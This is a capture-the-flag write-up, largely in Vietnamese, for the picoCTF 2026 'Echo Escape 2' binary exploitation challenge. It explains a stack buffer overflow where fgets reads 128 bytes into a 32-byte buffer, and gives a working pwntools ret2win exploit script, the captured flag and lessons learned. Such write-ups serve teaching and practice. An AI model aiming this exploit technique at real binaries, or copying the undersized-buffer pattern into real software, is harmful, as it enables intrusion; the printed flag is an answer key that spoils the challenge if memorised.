# Echo Escape 2

**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Points:** 100  
**CTF:** picoCTF 2026  
**Author:** Yahaya Meddy

---

## Challenge Description

![Challenge](image.png)

> The developer has learned their lesson from unsafe input functions and tried to secure the program by using `fgets()`. Unfortunately, they didn't use it correctly. Can you still find a way to read the flag?

---

## Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        perror("[!] Could not open flag.txt");
        exit(1);
    }

    char flag[128];
    fgets(flag, sizeof(flag), fp);
    printf("Flag: %s\n", flag);
    fflush(stdout);
    fclose(fp);
}

void vuln() {
    char buf[32];

    printf("Enter the secret key: ");
    fflush(stdout);

    fgets(buf, 128, stdin);   // <-- BUG: đọc 128 bytes vào buffer chỉ 32 bytes!

    printf("You entered:, %s\n", buf);
}

int main() {
    vuln();
    puts("Goodbye!");
    return 0;
}
```

**Lỗ hổng:** Trong hàm `vuln()`, buffer `buf` được khai báo với kích thước **32 bytes**, nhưng `fgets()` được gọi với tham số đọc **128 bytes**. Điều này tạo ra lỗ hổng **Stack Buffer Overflow** — attacker có thể ghi đè **saved return address** trên stack.

Hàm `win()` đọc và in ra nội dung file `flag.txt` nhưng **không bao giờ được gọi** trong luồng bình thường → đây là mục tiêu để nhảy tới (kỹ thuật **ret2win**).

---

## Binary Protections

![checksec](image-1.png)

| Protection | Status | Ý nghĩa |
|:----------:|:------:|:--------|
| Canary     | ❌ Disabled | Không bảo vệ stack → ghi đè return address tự do |
| NX         | ✅ Enabled  | Không thể chạy shellcode trên stack |
| PIE        | ❌ Disabled | Địa chỉ binary **cố định** → không cần leak |
| Fortify    | ❌ Disabled | Không kiểm tra buffer khi biên dịch |
| RelRO      | Partial     | GOT có thể bị ghi đè |

**Kết luận:** Không có canary + PIE tắt → ret2win là hướng khai thác hoàn hảo.

---

## Exploitation

### Bước 1 — Tính Offset

Buffer `buf` có kích thước 32 bytes. Trên x86 (32-bit), layout stack của `vuln()` sẽ là:

```
[ buf (32 bytes) ][ saved EBP (4 bytes) ][ saved EIP (4 bytes) ]
```

Vậy để ghi đè **saved EIP** (return address) ta cần:

```
offset = 32 (buf) + 4 (saved EBP) + ... = 44 bytes
```

> Offset tìm được thực tế = **44 bytes**

### Bước 2 — Địa chỉ hàm `win()`

Vì **PIE bị tắt**, địa chỉ của hàm `win()` là **hằng số** — có thể đọc từ binary bằng `objdump`, `readelf`, hoặc GDB:

```
Address của win() = 0x08049276
```

### Bước 3 — Xây dựng Payload

```
payload = 'A' * 44 + p32(0x08049276)
           \_______/   \____________/
           fill buffer   ghi đè return address → win()
```

### Exploit Script

![Exploit script](image-2.png)

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "i386"
context.log_level = "debug"

HOST = "dolphin-cove.picoctf.net"
PORT = 60511

io = remote(HOST, PORT)

payload = b"A" * 44 + p32(0x08049276)

io.recvuntil(b"Enter the secret key: ")
io.sendline(payload)

print(io.recvall(timeout=3).decode(errors="replace"))
```

---

## Result

![Flag output](image-3.png)

```
You entered:, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv•
Flag: picoCTF{fgets_0v3rfl0w42_79ccc1c5}
```

---

## Flag

```
picoCTF{fgets_0v3rfl0w42_79ccc1c5}
```

---

## Key Takeaways

- `fgets()` **không tự động an toàn** — nếu kích thước truyền vào lớn hơn buffer thực tế thì vẫn bị overflow.
- **Thiếu stack canary** cho phép ghi đè return address mà không bị phát hiện.
- **PIE disabled** giúp địa chỉ hàm `win()` là cố định → không cần bước leak địa chỉ.
- Kỹ thuật **ret2win**: thay vì inject shellcode (bị chặn bởi NX), ta nhảy thẳng đến hàm có sẵn trong binary để đọc flag.